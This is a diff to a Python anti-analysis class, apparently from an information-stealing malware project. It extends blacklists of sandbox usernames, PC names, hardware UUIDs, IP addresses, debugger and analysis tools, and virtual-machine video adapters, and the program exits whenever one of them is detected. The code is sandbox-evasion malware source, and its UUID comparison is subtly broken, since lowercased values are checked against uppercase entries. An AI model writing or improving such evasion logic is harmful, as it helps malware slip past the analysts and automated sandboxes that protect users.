@@ -17,9 +17,9 @@ class Debug:
 			'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez',
 			'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'nettypc', 'desktop-bugio', 'desktop-cbgpfee', 'server-pc', 'tiqiyla9tw5m',
 			'desktop-kalvino', 'compname_4047', 'desktop-19olltd', 'desktop-de369se', 'ea8c2e2a-d017-4', 'aidanpc', 'lucas-pc', 'marci-pc', 'acepc', 'mike-pc', 'desktop-iapkn1p',
-			'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42'
+			'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42', 'desktop-et51ajo'
 		}
-		self.blacklisted_hwids = {
+		self.blacklisted_uuids = {
 			'7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
 			'6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
 			'00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
@@ -52,7 +52,7 @@ class Debug:
 			'84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
 			'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
 			'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
-			'921E2042-70D3-F9F1-8CBD-B398A21F89C6'}
+			'921E2042-70D3-F9F1-8CBD-B398A21F89C6', '00000000-0000-0000-0000-000000000000'}
 		self.blacklisted_ips = {
 			'88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
 			'34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
@@ -85,7 +85,8 @@ class Debug:
 			"httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
 			"ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
 			"joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"}
-		self.video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter", "microsoft hyper-v-video", "microsoft remote display adapter"]
+		self.blacklisted_video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter","microsoft hyper-v-video",
+							"microsoft remote display adapter", "onrf_d", "pcwmg1n_e", "y9696y"]
 
 		if self.checks():
 			sys.exit(0)
@@ -125,8 +126,8 @@ class Debug:
 			if os.getenv('USERNAME').lower() in self.blacklisted_users or os.getenv('COMPUTERNAME').lower() in self.blacklisted_pc_names:
 				return True
 			with subprocess.Popen("wmic csproduct get uuid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as p:
-				hwid = p.stdout.read().decode('utf-8').strip().split('\n')[1].strip()
-				if hwid.lower() in self.blacklisted_hwids:
+				uuid = p.stdout.read().decode('utf-8').strip().split('\n')[1].strip()
+				if uuid.lower() in self.blacklisted_uuids:
 					return True
 		except Exception:
 			pass
@@ -135,7 +136,7 @@ class Debug:
 	def checkVideoController(self) -> bool:
 		with subprocess.Popen("wmic path win32_VideoController get name", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as p:
 			video_controller = p.stdout.read().decode('utf-8').lower()
-		r1 = any(controller in video_controller for controller in self.video_controllers)
+		r1 = any(controller in video_controller for controller in self.blacklisted_video_controllers)
 		r2 = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
 		return r1 or r2
 
